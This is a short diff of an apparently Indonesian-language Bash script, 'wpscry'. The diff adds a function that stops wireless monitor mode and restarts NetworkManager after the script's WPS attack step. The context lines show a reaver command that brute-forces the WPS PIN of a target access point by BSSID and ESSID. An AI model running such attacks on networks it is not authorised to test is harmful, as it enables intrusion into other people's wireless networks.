@@ -156,6 +156,12 @@ function menjalankan_serangan(){
 	reaver -i "${interface}" -c "${channel}" -b "${bssid}" -e "${essid}" -s "${sesi}"
 }
 
+function menonaktifkan_mode_monitor(){
+        airmon-ng stop "${interface}"
+	systemctl restart NetworkManager
+        exit 0
+}
+
 # fungsi utama wpscry
 function wpscry(){
 	cek_root
@@ -165,6 +171,7 @@ function wpscry(){
 	memindai_jaringan_wps
 	mengatur_target
 	menjalankan_serangan
+        menonaktifkan_mode_monitor
 }
 
 wpscry
